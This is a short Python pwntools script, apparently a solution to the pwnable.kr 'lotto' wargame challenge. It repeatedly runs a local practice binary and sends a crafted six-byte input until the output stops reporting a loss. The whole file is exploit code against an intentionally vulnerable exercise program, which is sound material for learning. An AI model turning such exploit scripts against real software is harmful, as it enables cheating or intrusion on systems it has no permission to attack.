#!/usr/bin/python

from pwn import *

while(1):

    r = process('/home/user/pwnable.kr/lotto/lotto1')

# play lotto option 1
    r.sendline(str(1))

# send lotto bytes
    print "[+] sending 6 bytes"
    r.sendline('\x01\x0d\x0e\x0e\x06\x06')
    a = r.recvall(timeout=.03)
    if "LOSS" not in a:
        break

    '''
    if "WIN" in r.recvall(timeout=.02):
        print "WON"
        exit(0)
    else:
        print "LOSS"
    '''
print a
